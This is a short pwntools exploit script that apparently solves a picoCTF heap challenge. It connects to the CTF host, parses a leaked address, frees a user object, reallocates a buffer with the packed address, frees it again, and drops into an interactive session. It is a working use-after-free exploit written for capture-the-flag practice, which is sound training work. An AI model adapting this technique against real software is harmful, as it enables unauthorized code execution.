from pwn import log, process, remote, time
import pwnlib.util.packing as pack

p = remote("mercury.picoctf.net", 58574)

p.sendline(b"S") # Get the memory leak

for i in range(9):
    try:
        inp = str(p.recvline()[21:].strip())[2:].strip("'") # Get the address from the leak
    except:
        log.info("")


inp = int(inp, 16) # Convert it to hex
log.info(f"{hex(inp)}")

p.sendline(b"I")    # Free user
p.sendline(b"Y")

p.sendline(b"L")    # Allocate the new buffer and write the address to it
time.sleep(1)
p.sendline(pack.p64(inp))

p.sendline(b"I")    # Free user again
p.sendline(b"Y")

p.interactive()